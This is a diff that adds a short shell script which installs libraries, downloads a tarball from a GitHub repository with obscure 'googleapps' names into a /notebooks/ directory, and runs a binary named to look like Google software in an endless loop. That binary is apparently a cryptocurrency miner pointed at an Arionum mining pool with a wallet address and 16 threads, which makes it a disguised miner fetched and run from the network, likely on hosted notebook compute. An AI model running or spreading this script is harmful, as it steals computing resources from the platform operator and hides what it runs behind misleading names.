@@ -1,0 +1,21 @@
+
+apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
+
+cd /notebooks/
+
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/googleapps847412741274.tar.gz
+tar -xvf ./googleapps847412741274.tar.gz
+
+cd googleapps8474
+
+while true
+do
+
+timeout 84 ./google84121274 -p http://mine.arionumpool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 16 -b 16
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+done
